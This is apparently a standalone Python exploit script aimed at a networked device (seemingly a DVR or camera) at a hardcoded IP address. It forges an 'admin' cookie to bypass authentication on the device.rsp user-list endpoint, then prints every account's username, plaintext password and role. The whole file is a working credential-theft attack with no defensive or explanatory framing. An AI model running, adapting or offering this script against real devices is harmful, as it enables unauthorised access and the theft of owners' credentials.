# -*- coding: utf-8 -*-
from __future__ import print_function
import json
import requests
import argparse
import tableprint as tp



HST     =   '210.186.98.122'
port    =   '80'

headers = {}

fullHost_1  =   "http://"+HST+":"+port+"/device.rsp?opt=user&cmd=list"
host        =   "http://"+HST+":"+port+"/"


headers["Host"]             =  host
headers["User-Agent"]       = "Morzilla/7.0 (911; Pinux x86_128; rv:9743.0)"
headers["Accept"]           = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" 
headers["Accept-Languag"]   = "es-AR,en-US;q=0.7,en;q=0.3"
headers["Connection"]       = "close"
headers["Content-Type"]     = "text/html"
headers["Cookie"]           = "uid="+"admin"

rX = requests.get(fullHost_1,headers=headers,timeout=10.000)
badJson = rX.text

try:
    dataJson = json.loads(badJson)
    totUsr = len(dataJson["list"])
except Exception as e:
    print(" [+] Error: "+str(e))
    print(" [>] json: "+str(rX))
    exit()
print(str(host))
print((port))
print(str(totUsr))
print("--------------------------------------------------------------------------------------- ")

final_data = []
try:
    for obj in range(0,totUsr):

        temp = []

        _usuario    = dataJson["list"][obj]["uid"]
        _password   = dataJson["list"][obj]["pwd"]
        _role       = dataJson["list"][obj]["role"]

        temp.append(_usuario) 
        temp.append(_password)
        temp.append(_role)

        final_data.append(temp)

        hdUsr  ="Username"
        hdPass ="Password" 
        hdRole = "Role ID" 

        cabeceras = [hdUsr, hdPass, hdRole] 

    tp.table(final_data, cabeceras, width=20)

except Exception as e:
    print(" [!]: "+str(e))
    print(" [+] "+ str(dataJson))

